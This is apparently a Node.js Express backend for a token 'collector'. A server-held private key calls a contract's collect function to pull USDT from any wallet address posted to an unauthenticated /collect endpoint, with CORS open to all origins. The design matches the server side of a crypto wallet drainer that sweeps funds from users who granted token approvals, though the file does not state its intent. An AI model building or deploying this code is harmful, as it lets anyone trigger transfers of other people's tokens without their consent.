const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { ethers } = require("ethers");

const app = express();
app.use(bodyParser.json());
app.use(cors());

const provider = new ethers.providers.JsonRpcProvider(process.env.RPC_URL);
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

const COLLECTOR_ABI = [
  "function collect(address token, address from, uint256 amount) external"
];

const collector = new ethers.Contract(
  process.env.COLLECTOR_ADDRESS,
  COLLECTOR_ABI,
  wallet
);

app.get("/ping", (req, res) => {
  res.send("Collector backend is alive ✅");
});

app.post("/collect", async (req, res) => {
  try {
    const { userAddress, amount } = req.body;
    if (!userAddress || !amount) {
      return res.status(400).json({ error: "Missing params" });
    }

    const decimals = 18;
    const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);

    const tx = await collector.collect(process.env.USDT_ADDRESS, userAddress, amountInWei);
    await tx.wait();

    res.json({ success: true, txHash: tx.hash });
  } catch (err) {
    console.error("Collector error:", err);
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Collector backend running on port ${PORT}`));
